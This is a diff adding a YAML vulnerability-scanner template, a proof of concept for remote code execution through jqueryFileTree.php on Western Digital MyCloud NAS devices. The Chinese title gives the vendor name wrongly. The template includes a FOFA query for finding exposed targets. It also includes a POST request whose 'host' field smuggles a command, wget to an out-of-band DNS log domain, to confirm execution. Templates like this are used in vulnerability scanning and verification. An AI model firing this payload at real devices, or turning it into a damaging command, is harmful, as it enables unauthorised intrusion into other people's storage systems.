@@ -1,0 +1,21 @@
+id: poc-yaml-west-nas-jqueryfiletree-php-rce
+info:
+  name: 西部数码 NAS jqueryFileTree.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /web/addons/jqueryFileTree.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: host=";wget {{.domain}};"
+  expression: status_code == 200 && contains(headers,"X-Powered-By\x3a PHP/5.4.16")
+    && body == "" && reverse.Verify()
+transport: http
